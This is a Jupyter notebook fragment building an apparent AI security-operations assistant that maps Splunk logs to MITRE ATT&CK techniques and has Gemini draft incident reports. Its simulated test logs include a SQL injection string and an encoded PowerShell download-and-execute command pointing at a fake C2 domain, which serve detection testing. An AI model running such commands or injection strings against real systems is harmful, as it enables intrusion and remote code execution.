    "    report_powershell = ai_soc_analyst_assistant(splunk_query_powershell, incident_summary=\"Highly suspicious encoded PowerShell command executed on an endpoint.\")\n",
    "    print(report_powershell)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4750820b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Checking/Populating Security Knowledge Base with MITRE ATT&CK ---\n",
      "MITRE ATT&CK data already present in knowledge base (823 techniques found). Skipping initial population.\n",
      "Sample security knowledge appears to be present. Skipping population.\n",
      "\n",
      "Total unique documents in knowledge base: 826\n",
      "\n",
      "\n",
      "=== Running Combined Simulated Scenario (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query: | makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\" 404 200 \"-\" \"Mozilla/5.0\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZgBhAGsAZQBkAG8AbwBtAGEAaW4ALwBwAGEAYQB5AGwAbwBhAGQALgBwAHMAMAAiACkAKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time ---\n",
      "DEBUG: Attempting to run Splunk query (check for exact string):\n",
      "```\n",
      "| makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\" 404 200 \"-\" \"Mozilla/5.0\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZgBhAGsAZQBkAG8AbwBtAGEAaW4ALwBwAGEAYQB5AGwAbwBhAGQALgBwAHMAMAAiACkAKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time\n",
      "```\n",
      "Error connecting to Splunk: Remote end closed connection without response\n",
      "Failed to connect to Splunk. Cannot proceed.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "import chromadb\n",
    "import google.generativeai as genai\n",
    "from stix2 import MemoryStore, Filter, AttackPattern\n",
    "from dotenv import load_dotenv\n",
    "load_dotenv(\"app.env\")\n",
    "\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\")\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "SPLUNK_TOKEN=os.environ.get(\"SPLUNK_TOKEN\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Please set it before running.\")\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# --- Helper Functions (no changes needed here, assuming previous fixes are in place) ---\n",
    "def connect_to_splunk():\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=\"127.0.0.1\",\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"http\" # Keep this if your Splunk 8089 is HTTP\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    try:\n",
    "        kwargs = {\"earliest_time\": earliest_time, \"latest_time\": latest_time, \"output_mode\": output_mode}\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "        while not job.is_ready():\n",
    "            pass\n",
    "        if job.is_done():\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel()\n",
    "            return events\n",
    "        else:\n",
    "            print(f\"Splunk search job failed: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "\n",
    "def get_embedding(text):\n",
    "    try:\n",
    "        response = genai.embed_content(model='embedding-001', content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding: {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=\"enterprise-attack.json\"):\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "        attack_data_points = []\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "        for tech in techniques:\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            external_ids = [ext_ref['external_id'] for ext_ref in tech.external_references if 'external_id' in ext_ref and ext_ref.get('source_name') == 'mitre-attack']\n",
    "            mitre_id = next((id for id in external_ids if id.startswith('T')), None)\n",
    "            if not mitre_id:\n",
    "                continue\n",
    "            tactics_names = []\n",
    "            for relationship in stix_store.query(Filter(\"source_ref\", \"=\", tech.id), Filter(\"relationship_type\", \"=\", \"uses\")):\n",
    "                tactic_obj = stix_store.query(Filter(\"id\", \"=\", relationship.target_ref))\n",
    "                if tactic_obj and tactic_obj[0].type == 'tactic':\n",
    "                    tactics_names.append(tactic_obj[0].name)\n",
    "            tactics_str = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "            full_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {tactics_str}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_str,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        return attack_data_points\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at {stix_json_path}\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result['ids'])\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "        if unique_id in existing_ids:\n",
    "            continue\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding:\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Failed to generate embedding for: {dp['text'][:50]}...\")\n",
    "    if docs_to_add:\n",
    "        security_collection.add(\n",
    "            documents=docs_to_add,\n",
    "            embeddings=embeddings_to_add,\n",
    "            metadatas=metadatas_to_add,\n",
    "            ids=ids_to_add\n",
    "        )\n",
    "        print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "    else:\n",
    "        print(\"No new documents to add to the vector store.\")\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    model = genai.GenerativeModel('gemini-pro')\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name')} ({mapping.get('technique_id')})\\n\"\n",
    "            if mapping.get('tactics') and mapping['tactics'] != 'N/A':\n",
    "                mitre_details_str += f\"  **Tactics:** {mapping['tactics']}\\n\"\n",
    "            mitre_details_str += f\"  **Description:** {mapping['description'][:200]}...\\n\"\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score'):.2f}\\n\"\n",
    "\n",
    "    prompt = f\"\"\"\n",
    "    You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, relevant security knowledge, and potential MITRE ATT&CK mappings.\n",
    "\n",
    "    ---\n",
    "    **Splunk Logs (Raw Data for Context):**\n",
    "    {splunk_logs}\n",
    "\n",
    "    ---\n",
    "    **Relevant Security Knowledge (from Vector Store):**\n",
    "    {relevant_knowledge if relevant_knowledge else \"No specific relevant security knowledge found.\"}\n",
    "\n",
    "    ---\n",
    "    **Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "    {mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "    ---\n",
    "    **Incident Summary (if provided):**\n",
    "    {incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "    ---\n",
    "    **Instructions for Report Generation:**\n",
    "    1.  **Incident Title:** Create a clear and descriptive title.\n",
    "    2.  **Date/Time of Detection:** Extract from logs. Provide a range if multiple times.\n",
    "    3.  **Affected Systems/Users:** Identify from logs.\n",
    "    4.  **Description of Incident:** Summarize the events chronologically and explain what happened. **Crucially, integrate and explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques.**\n",
    "    5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified. Prioritize based on the provided mappings and your understanding of the logs.\n",
    "    6.  **Impact:** Briefly describe potential impact (e.g., data breach, service disruption, account compromise).\n",
    "    7.  **Recommended Actions/Remediation:** Based on relevant knowledge (playbooks) and log analysis, suggest immediate and long-term actions.\n",
    "    8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "    9.  **Analyst Notes:** Any other observations, open questions, or next steps.\n",
    "\n",
    "    Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "    \"\"\"\n",
    "    try:\n",
    "        response = model.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query: {splunk_query} ---\")\n",
    "    \n",
    "    # Debug print: This will show the exact query string being sent\n",
    "    print(f\"DEBUG: Attempting to run Splunk query (check for exact string):\\n```\\n{splunk_query}\\n```\")\n",
    "\n",
    "    splunk_service = connect_to_splunk()\n",
    "    if not splunk_service:\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "    \n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query, earliest_time=\"-24h\", latest_time=\"now\")\n",
    "    \n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "        return \"No relevant Splunk logs found to generate a report.\"\n",
    "    \n",
    "    formatted_splunk_logs = \"\\n\".join([str(event) for event in raw_splunk_events])\n",
    "    \n",
    "    print(\"Searching vector store for relevant general security knowledge...\")\n",
    "    general_knowledge_query = f\"Based on these security logs, what are relevant security playbooks, past incidents, or policies? Logs: {formatted_splunk_logs}\"\n",
    "    general_knowledge_results = search_security_knowledge_base(\n",
    "        general_knowledge_query,\n",
    "        n_results=3,\n",
    "        filter_metadata={\"type\": {\"$ne\": \"mitre_attack_technique\"}}\n",
    "    )\n",
    "    relevant_knowledge_str = \"\"\n",
    "    if general_knowledge_results and general_knowledge_results['documents']:\n",
    "        print(\"Found relevant general knowledge:\")\n",
    "        for i, doc in enumerate(general_knowledge_results['documents'][0]):\n",
    "            relevant_knowledge_str += f\"* **Source:** {general_knowledge_results['metadatas'][0][i].get('type', 'N/A')} ({general_knowledge_results['metadatas'][0][i].get('incident_type', '')})\\n\"\n",
    "            relevant_knowledge_str += f\"    **Content:** {doc}\\n\\n\"\n",
    "    else:\n",
    "        print(\"No specific relevant general knowledge found in vector store.\")\n",
    "    print(\"Searching vector store for potential MITRE ATT&CK mappings...\")\n",
    "    mitre_mapping_query = f\"Analyze the following security events and identify potential MITRE ATT&CK tactics and techniques: {formatted_splunk_logs}\"\n",
    "    mitre_mapping_results = search_security_knowledge_base(\n",
    "        mitre_mapping_query,\n",
    "        n_results=10,\n",
    "        filter_metadata={\"type\": \"mitre_attack_technique\"}\n",
    "    )\n",
    "    identified_mitre_mappings = []\n",
    "    if mitre_mapping_results and mitre_mapping_results['documents']:\n",
    "        print(\"Found potential MITRE ATT&CK mappings:\")\n",
    "        for i, doc_content in enumerate(mitre_mapping_results['documents'][0]):\n",
    "            metadata = mitre_mapping_results['metadatas'][0][i]\n",
    "            distance = mitre_mapping_results['distances'][0][i]\n",
    "            if distance < distance_threshold:\n",
    "                identified_mitre_mappings.append({\n",
    "                    \"technique_name\": metadata.get('technique_name'),\n",
    "                    \"technique_id\": metadata.get('technique_id'),\n",
    "                    \"tactics\": metadata.get('tactics'),\n",
    "                    \"description\": doc_content,\n",
    "                    \"distance_score\": distance\n",
    "                })\n",
    "        identified_mitre_mappings.sort(key=lambda x: x['distance_score'])\n",
    "        identified_mitre_mappings = identified_mitre_mappings[:5]\n",
    "        for mapping in identified_mitre_mappings:\n",
    "            print(f\"  - {mapping['technique_id']}: {mapping['technique_name']} (Score: {mapping['distance_score']:.2f})\")\n",
    "    else:\n",
    "        print(\"No relevant MITRE ATT&CK techniques found within the threshold.\")\n",
    "    print(\"Generating incident report with Gemini...\")\n",
    "    incident_report = generate_incident_report(\n",
    "        formatted_splunk_logs,\n",
    "        relevant_knowledge_str,\n",
    "        identified_mitre_mappings,\n",
    "        incident_summary\n",
    "    )\n",
    "    print(\"\\n--- AI SOC Analyst Assistant Completed ---\")\n",
    "    return incident_report\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Checking/Populating Security Knowledge Base with MITRE ATT&CK ---\")\n",
    "    total_docs_in_db = security_collection.count()\n",
    "    needs_mitre_population = False\n",
    "    \n",
    "    if total_docs_in_db == 0:\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. MITRE ATT&CK data needs to be populated.\")\n",
    "    else:\n",
    "        try:\n",
    "            mitre_techniques_in_db = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])\n",
    "            if len(mitre_techniques_in_db['ids']) == 0:\n",
    "                needs_mitre_population = True\n",
    "                print(\"Other documents found, but MITRE ATT&CK data is not present in knowledge base. Populating now...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data already present in knowledge base ({len(mitre_techniques_in_db['ids'])} techniques found). Skipping initial population.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Error checking for existing MITRE data with .get(): {e}\")\n",
    "            print(\"Assuming MITRE data needs population to be safe.\")\n",
    "            needs_mitre_population = True\n",
    "\n",
    "    if needs_mitre_population:\n",
    "        mitre_data_points = load_mitre_attack_data(stix_json_path=\"enterprise-attack.json\")\n",
    "        if mitre_data_points:\n",
    "            populate_security_knowledge_base(mitre_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. Mapping might be less effective.\")\n",
    "    \n",
    "    sample_data_present = False\n",
    "    try:\n",
    "        if security_collection.get(ids=[\"playbook_phishing_response\"], include=[])['ids']:\n",
    "            sample_data_present = True\n",
    "    except Exception as e:\n",
    "        print(f\"Warning: Error checking for sample data: {e}. Will attempt to add.\")\n",
    "        sample_data_present = False\n",
    "\n",
    "    if not sample_data_present:\n",
    "        print(\"Sample security knowledge not fully present. Populating now...\")\n",
    "        sample_security_knowledge = [\n",
    "            {\"id\": \"playbook_phishing_response\", \"text\": \"Playbook: Phishing Incident Response. Trigger: User reports suspicious email or email gateway alert. Steps: 1. Verify email authenticity (headers, sender reputation). 2. Check for malicious attachments/links (sandbox). 3. If malicious, remove email from all affected inboxes. 4. Reset user password if credentials compromised. 5. Educate user. 6. Block malicious sender/domains at firewall/proxy. 7. Log and document. Severity: Medium to High depending on compromise.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"phishing\"}},\n",
    "            {\"id\": \"playbook_malware_containment\", \"text\": \"Playbook: Malware Containment and Eradication. Trigger: EDR alert, antivirus detection, or user report of suspicious activity. Steps: 1. Isolate infected host(s) from network immediately. 2. Collect forensic data (memory dump, process list). 3. Run full endpoint scan. 4. Identify persistence mechanisms (registry, scheduled tasks, services). 5. Remove malware and persistence. 6. Restore affected files from clean backup. 7. Update security definitions. Severity: High.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"malware\"}},\n",
    "            {\"id\": \"inc_003_unauth_db_access\", \"text\": \"Past Incident: Incident ID INC-2024-003. Type: Unauthorized Access - Database. Date: 2024-05-10. Affected: Customer Database (MySQL). Attack Vector: Brute force via SSH followed by database privilege escalation. Description: Numerous failed SSH logins from external IP, then successful login to 'admin' account, followed by `SELECT * FROM users;` queries. Containment: Blocked source IP at firewall, disabled compromised admin account, rotated DB credentials. Impact: Potential exfiltration of customer PII. Lessons Learned: Implement MFA for all admin accounts, stronger password policies. MITRE ATT&CK T1078 (Valid Accounts), T1110 (Brute Force).\", \"metadata\": {\"type\": \"past_incident\", \"incident_type\": \"unauthorized_access\", \"mitre_id\": \"T1078, T1110\"}},\n",
    "        ]\n",
    "        populate_security_knowledge_base(sample_security_knowledge)\n",
    "    else:\n",
    "        print(\"Sample security knowledge appears to be present. Skipping population.\")\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run scenarios with corrected simulated data generation ---\n",
    "    # IMPORTANT: The string must start with \"\"\"| makeresults and end with \"\"\" (no newline after last \"\"\")\n",
    "    splunk_simulated_logs = \"\"\"| makeresults count=6\n",
    "| streamstats count as rn\n",
    "| eval _time = case(\n",
    "    rn=1, relative_time(now(), \"-30s\"),\n",
    "    rn=2, relative_time(now(), \"-25s\"),\n",
    "    rn=3, relative_time(now(), \"-20s\"),\n",
    "    rn=4, relative_time(now(), \"-15s\"),\n",
    "    rn=5, relative_time(now(), \"-10s\"),\n",
    "    rn=6, relative_time(now(), \"-5s\")\n",
    "  )\n",
    "| eval host = case(\n",
    "    rn <= 5, \"webserver-01\",\n",
    "    rn=6, \"endpoint-05\"\n",
    "  )\n",
    "| eval source = case(\n",
    "    rn <= 4, \"/var/log/auth.log\",\n",
    "    rn=5, \"/var/log/apache2/access.log\",\n",
    "    rn=6, \"PowerShell Operational Log\"\n",
    "  )\n",
    "| eval _raw = case(\n",
    "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\",\n",
    "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZgBhAGsAZQBkAG8AbwBtAGEAaW4ALwBwAGEAYQB5AGwAbwBhAGQALgBwAHMAMAAiACkAKQAKAA==\"\n",
    "  )\n",
    "| table _time, host, source, _raw\n",
    "| sort _time\"\"\" # Ensure this line is exactly as shown, with \"\"\" immediately after _time\n",
    "\n",
    "    print(\"\\n\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "    report_combined = ai_soc_analyst_assistant(splunk_simulated_logs, incident_summary=\"Simulated multiple failed SSH login attempts, a successful login, an attempted SQL Injection, and an encoded PowerShell command on an endpoint.\")\n",
    "    print(report_combined)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9cdb190",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "96393897",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "trying to connect\n",
      "Successfully connected to Splunk and obtained session token.\n",
      "Session Token: <class 'splunklib.binding._NoAuthenticationToken'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "(<splunklib.client.Service at 0x1fb87e5c310>,\n",
       " splunklib.binding._NoAuthenticationToken)"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import splunklib.client as client\n",
    "\n",
    "# ... (your existing SPLUNK_HOST, SPLUNK_PORT, SPLUNK_USERNAME, SPLUNK_PASSWORD)\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"localhost\")\n",
    "SPLUNK_PORT = os.environ.get(\"SPLUNK_PORT\", 8000)\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\")\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\")\n",
    "\n",
    "def connect_and_get_token():\n",
    "    print('trying to connect')\n",
    "    try:\n",
    "        service = client.Service(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            session_token=SPLUNK_TOKEN\n",
    "\n",
    "        )\n",
    "        session_token = service.token # The token is accessible via service.token\n",
    "        print(\"Successfully connected to Splunk and obtained session token.\")\n",
    "        print(f\"Session Token: {session_token}\")\n",
    "        return service, session_token\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None, None\n",
    "connect_and_get_token()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "eb1c0725",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Starting Splunk Dummy Data Test ---\n",
      "Attempting to connect to Splunk at 127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "Attempting to run Splunk query:\n",
      "```\n",
      "| makeresults count=3\n",
      "| eval _time=strftime(now(), \"%Y-%m-%d %H:%M:%S\")\n",
      "| streamstats count as event_id\n",
      "| eval message=case(event_id=1, \"This is dummy event 1\",\n",
      "                     event_id=2, \"This is dummy event 2\",\n",
      "                     event_id=3, \"This is dummy event 3\")\n",
      "| eval host=case(event_id=1, \"test-host-01\",\n",
      "                  event_id=2, \"test-host-01\",\n",
      "                  event_id=3, \"test-host-02\")\n",
      "| table _time, host, event_id, message\n",
      "```\n",
      "Successfully retrieved 3 events from Splunk.\n",
      "\n",
      "--- Retrieved Dummy Data ---\n",
      "OrderedDict([('_time', '2025-05-24 23:08:25'), ('host', 'test-host-01'), ('event_id', '1'), ('message', 'This is dummy event 1')])\n",
      "OrderedDict([('_time', '2025-05-24 23:08:25'), ('host', 'test-host-01'), ('event_id', '2'), ('message', 'This is dummy event 2')])\n",
      "OrderedDict([('_time', '2025-05-24 23:08:25'), ('host', 'test-host-02'), ('event_id', '3'), ('message', 'This is dummy event 3')])\n",
      "\n",
      "Logged out from Splunk.\n",
      "--- Splunk Dummy Data Test Completed ---\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\mohamed elmadany\\AppData\\Local\\Temp\\ipykernel_20476\\3511454413.py:59: DeprecatedWarning: ResultsReader is deprecated. Use the JSONResultsReader function instead in conjuction with the 'output_mode' query param set to 'json'\n",
      "  reader = results.ResultsReader(job.results())\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# --- Configuration ---\n",
    "# Set these environment variables, or hardcode them for quick testing (NOT recommended for production)\n",
    "# Example:\n",
    "# export SPLUNK_HOST=\"127.0.0.1\"\n",
    "# export SPLUNK_PORT=\"8089\"\n",
    "# export SPLUNK_USERNAME=\"admin\"\n",
    "# export SPLUNK_PASSWORD=\"changeme\"\n",
    "\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8000))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
